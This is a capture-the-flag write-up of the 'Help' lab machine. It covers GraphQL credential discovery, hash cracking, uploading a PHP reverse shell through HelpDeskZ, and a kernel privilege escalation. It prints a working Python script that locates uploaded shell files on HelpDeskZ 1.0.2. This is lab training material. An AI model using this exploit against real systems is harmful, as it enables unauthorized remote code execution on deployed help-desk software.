# Help

## Info
  * IP : 10.10.10.121
  * OS : Linux
  * DIfficulty: Easy/Medium

## System Enumeration

### NMAP
![nmap](boxImages/Help/nmap.png "NMAP")

### Port 80
![port 80](boxImages/Help/port80.png "Port 80")

### Port 3000
![port 3000](boxImages/Help/port3k.png "Port 3000")

nmap shows port 3000 hosts the node.js express framework, loading up port 3000 we see that we need to enter a query.  
A quick google search for "query + nodejs + express" gives us a new keyword "graphql".  

So, we check for graphql by simply typing `/graphql` 

### Finding Credentials

To read and interact with GraphQL properly, I used the JSON decoder of the BurpSuite.  
![Burp Suite](boxImages/Help/credsfound.png "Burp Suite")

The password hash found can be easily cracked using online utilities such as crackstation.  
![Cracked Password](boxImages/Help/crackedpw.png "Cracked Password")

### Support Page

HelpDeskZ is being used for the support API of the website, and since we've already found the credentials, we can easily login.  
![Support Page](boxImages/Help/supportPage.png "Support Page")

![Logged In](boxImages/Help/loggedInHelpDeskz.png "Logged In")

#### Exploitation

Looking for a possible exploit, I found `https://www.exploit-db.com/exploits/40300` to be of use.  

```
import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
```

We can upload a reverse shell through the HelpDeskZ portal along with a ticket and use the given python code to find our uploaded shell.  

*Although it can be done without logging in, the login helped me with the timezone matching problem, without which I'd have to edit the exploit.py according to my timezone.*

Since the tickets formed, keep changing with respect to the time, we match our timezone with the timezone of the HelpDeskz portal.  

![TimeServer](boxImages/Help/timezoneServer.png "Time Zone Server Change")

![TimeClient](boxImages/Help/timezoneClient.png "TIme Zone Client Change")

Now, we should upload our shell.  

Using a simple `php-reverse-shell` provided by `pentestmonkey`, I simply changed the required values and uploaded it as a ticket file.  

![uploaded shell](boxImages/Help/uploadingShell.png "Uploading the php shell")

As I submitted my ticket, I received the error `File Not Allowed`, but looking at the source code of HelpDeskz, this error is bogus and the file is still uploaded.  

So, we run the exploit  
![Python Exploit](boxImages/Help/pyexploit.png "PyExploit")  

File found! So we create a listener and open up our shell and voila! We are in
![Listening for Shell](boxImages/Help/listeningForShell.png "Listening for Shell")  

## User Found

![User Found](boxImages/Help/userfound.png "User")

## Privilege Escalation

Enumerating the system, we get the following information  
![PrivEsc 1](boxImages/Help/privesc1.png "Privilege Enumeration")

Searching for a possible exploit on searchsploit  
![SearchSploit](boxImages/Help/searchsploit.png "Searchsploit")

Looking up the kernel exploit and running it on the machine, we get root!
![Root Gained](boxImages/Help/rootgained.png "Rooted!")

Thank you for reading!